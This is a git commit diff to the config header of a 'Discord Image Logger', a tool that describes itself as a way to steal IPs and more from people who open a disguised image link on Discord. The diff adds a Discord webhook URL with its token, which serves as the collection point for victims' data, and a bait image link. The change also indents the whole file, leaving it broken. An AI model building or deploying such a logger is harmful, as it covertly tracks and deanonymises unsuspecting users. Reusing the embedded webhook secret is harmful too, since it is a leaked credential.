936d5c09f76d3e01bd367de045c993ded7d714e0
3b3cin <121109340+3b3cin@users.noreply.github.com>
2025-03-17 09:08:07 +0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -1,19 +1,24 @@
-# Discord Image Logger
-# moaz private project for school
+    # Discord Image Logger
+    # moaz
 
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
+    from http.server import BaseHTTPRequestHandler
+    from urllib import parse
+    import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "moaz"
-                                           # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    __app__ = "Discord Image Logger"
+    __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+    __version__ = "v2.0"
+    __author__ = "moaz"
+
+    config = {
+        # BASE CONFIG #
+        "webhook": "https://discord.com/api/webhooks/1350915922595938517/R-YtyLMUhgLQkJYIVET0RO9sKmuNkDkJ7QUqx1Jepuogez_nvKu8mk9ZbuTU86QfzzSDk",
+        "image": "https://th.bing.com/th/id/R.cbb56972bb0f1e311e38c0473fc0bf94?rik=kbl3gpbbZ6pOIw&pid=ImgRaw&r=0", # You can also have a custom image by using a URL argument
+                                                   # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
         "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
         # CUSTOMIZATION #
-        "username": "Image Logger", # Set this to the name you want the webhook to have
+        "username": "moaz say hi !!!", # Set this to the name you want the webhook to have
         "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
         # OPTIONS #
